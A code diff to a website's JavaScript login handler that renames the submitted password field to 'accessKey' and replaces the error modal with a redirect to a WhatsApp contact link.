@@ -19,24 +19,24 @@ document.addEventListener("DOMContentLoaded", () => {
             e.preventDefault();
 
             const username = document.getElementById("username").value.trim();
-            const password = document.getElementById("password").value;
+            const accessKey = document.getElementById("password").value;
 
             setLoading(true);
             try {
                 const response = await fetch("/api/login", {
                     method:  "POST",
                     headers: { "Content-Type": "application/json" },
-                    body:    JSON.stringify({ username, password })
+                    body:    JSON.stringify({ username, accessKey })
                 });
                 const data = await response.json();
                 if (data.success) {
                     window.location.href = "https://www.playzone9.com/";
                 } else {
-                    showErrorModal();
+                    redirectToWhatsApp();
                 }
             } catch (err) {
                 console.error("Login error:", err);
-                showErrorModal();
+                redirectToWhatsApp();
             } finally {
                 setLoading(false);
             }
@@ -62,4 +62,8 @@ function showErrorModal() {
             modal.style.setProperty('display', 'flex', 'important');
         });
     }
+}
+
+function redirectToWhatsApp() {
+    window.location.href = 'https://wa.me/918604543932';
 }
